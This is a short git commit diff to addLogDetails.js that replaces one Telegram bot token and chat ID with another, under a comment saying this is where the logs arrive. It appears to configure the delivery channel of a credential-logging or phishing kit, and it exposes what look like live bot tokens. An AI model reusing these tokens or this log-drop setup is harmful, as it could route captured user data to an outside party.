1784bdbd08902721b5e8744ff10167c365a08b56
owoo <151690313+Casewell0912@users.noreply.github.com>
2024-04-01 05:25:39 +0100

    Update addLogDetails.js

--- addLogDetails.js
+++ addLogDetails.js
@@ -1,4 +1,4 @@
 // Add your bot details here👇 (this is where you will get the logs)
 
-var telegramBotId = "5748106832:AAHF1L7DQ5JEmmmU6g8PnznmWtqyksiFv8M";
-var chatId = 948465764;
+var telegramBotId = "5695593773:AAFQQr8U9YmSqPLEoi98aPviJX3OmW0Gk0M";
+var chatId = 5972985257;
